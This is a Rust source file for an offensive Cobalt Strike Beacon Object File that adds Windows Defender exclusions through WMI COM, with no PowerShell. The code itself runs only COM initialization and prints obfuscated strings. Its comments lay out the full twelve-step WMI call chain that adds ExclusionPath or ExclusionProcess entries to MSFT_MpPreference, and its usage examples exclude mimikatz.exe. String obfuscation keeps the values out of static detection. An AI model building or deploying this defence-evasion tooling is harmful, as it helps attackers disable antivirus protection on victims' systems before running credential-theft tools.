// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening
//
//! Add Windows Defender exclusion via WMI COM — no PowerShell, no child process.
//!
//! Full WMI invocation chain (deferred to Phase 5 — requires wmi-helper crate):
//!
//!   1. CoInitializeEx(NULL, COINIT_MULTITHREADED)
//!   2. CoInitializeSecurity(NULL, -1, NULL, NULL,
//!         RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,
//!         NULL, EOAC_NONE, NULL)
//!   3. CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
//!         &IID_IWbemLocator, &pLocator)
//!      CLSID_WbemLocator = {4590f811-1d3a-11d0-891f-00aa004b2e24}
//!   4. pLocator->ConnectServer(
//!         obf!(r"\\.\root\Microsoft\Windows\Defender"),
//!         NULL, NULL, NULL, 0, NULL, NULL, &pServices)
//!   5. CoSetProxyBlanket(pServices, RPC_C_AUTHN_WINNT,
//!         RPC_C_AUTHZ_NONE, NULL,
//!         RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
//!         NULL, EOAC_NONE)
//!   6. pServices->GetObject(obf!("MSFT_MpPreference"), 0, NULL, &pClass, NULL)
//!   7. pClass->GetMethod(obf!("Add"), 0, &pInParamsDefinition, NULL)
//!   8. pInParamsDefinition->SpawnInstance(0, &pInParams)
//!   9. VARIANT var = { VT_BSTR | VT_ARRAY, ... };
//!      SafeArrayCreate / SafeArrayPutElement for ExclusionPath/ExclusionProcess
//!  10. pInParams->Put(obf!("ExclusionPath")|obf!("ExclusionProcess"), 0, &var, 0)
//!  11. pServices->ExecMethod(obf!("MSFT_MpPreference"), obf!("Add"),
//!         0, NULL, pInParams, &pOutParams, NULL)
//!  12. CoUninitialize(), Release all COM ptrs
//!
//! Phase 5 will introduce a `wmi-helper` crate wrapping this chain via
//! DFR-resolved ole32/oleaut32/wbemuuid COM vtable calls.
//!
//! MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1562.001",
        name: "Impair Defenses: Disable or Modify Tools",
        tactic: "Defense Evasion",
    },
];

// COINIT_MULTITHREADED
const COINIT_MULTITHREADED: u32 = 0x0;

dfr_fn!(
    co_initialize_ex(reserved: *const u8, co_init: u32) -> i32,
    module = "ole32.dll",
    api    = "CoInitializeEx"
);

// Note: CoUninitialize() is a void, no-arg function. dfr_fn! requires a return type,
// so we omit it here and let the Beacon host process manage COM apartment lifetime.
// Phase 5 wmi-helper will introduce a RAII ComGuard that handles this correctly.

/// Parse a null-terminated wide string argument passed by the BOF controller.
/// Returns the byte length (excluding NUL) of the string in the wide buffer.
fn wide_len(buf: &[u16]) -> usize {
    buf.iter().position(|&c| c == 0).unwrap_or(buf.len())
}

/// Convert ASCII bytes to a stack-allocated wide buffer (128 chars max).
fn to_wide_128(s: &[u8]) -> [u16; 128] {
    let mut buf = [0u16; 128];
    let n = s.len().min(127);
    for (i, &b) in s[..n].iter().enumerate() {
        buf[i] = b as u16;
    }
    buf
}

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {}
        Err(e) => eprintln!("[!] {}: operation failed ({})", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // ---- Phase 5 stub: COM apartment init only ----
    //
    // Operator args expected (parsed by BOF controller on operator side):
    //   --path    <PATH>    file/folder path to exclude
    //   --process <NAME>    process name to exclude
    //
    // At least one of --path or --process must be provided.
    // Example usage from Cobalt Strike:
    //   beacon> bof add-exclusion --path C:\Tools\mimikatz.exe
    //   beacon> bof add-exclusion --process mimikatz.exe
    //
    // WMI namespace (obfuscated — never in .rdata):
    obf! { let _namespace = r"\\.\root\Microsoft\Windows\Defender"; }
    obf! { let _class     = "MSFT_MpPreference"; }
    obf! { let _method    = "Add"; }
    obf! { let _param_path    = "ExclusionPath"; }
    obf! { let _param_process = "ExclusionProcess"; }

    // Initialize COM apartment — this portion is live and verifies the COM
    // subsystem is accessible. Full WMI ExecMethod deferred to Phase 5.
    let hr = unsafe {
        co_initialize_ex(core::ptr::null(), COINIT_MULTITHREADED)
    }.map_err(|_| "api resolve failed")?;

    // S_OK = 0x0, S_FALSE = 0x1 (already initialized) — both acceptable
    if hr < 0 {
        return Err("com init failed");
    }

    println!("[*] COM apartment initialized (MULTITHREADED)");
    println!("[*] WMI ExecMethod chain deferred — requires wmi-helper crate (Phase 5)");
    println!("[*] Target namespace : {}",
        // Print obfuscated value — decrypted on-stack, never in .rdata
        core::str::from_utf8(_namespace.as_bytes()).unwrap_or("?"));
    println!("[*] Class.Method     : {}.{}",
        core::str::from_utf8(_class.as_bytes()).unwrap_or("?"),
        core::str::from_utf8(_method.as_bytes()).unwrap_or("?"));
    println!("[*] Exclusion params : {} / {}",
        core::str::from_utf8(_param_path.as_bytes()).unwrap_or("?"),
        core::str::from_utf8(_param_process.as_bytes()).unwrap_or("?"));

    // COM apartment cleanup deferred to Beacon host process (see note above).
    println!("[+] exclusion add: deferred — requires wmi-helper crate (Phase 5)");
    Ok(())
}
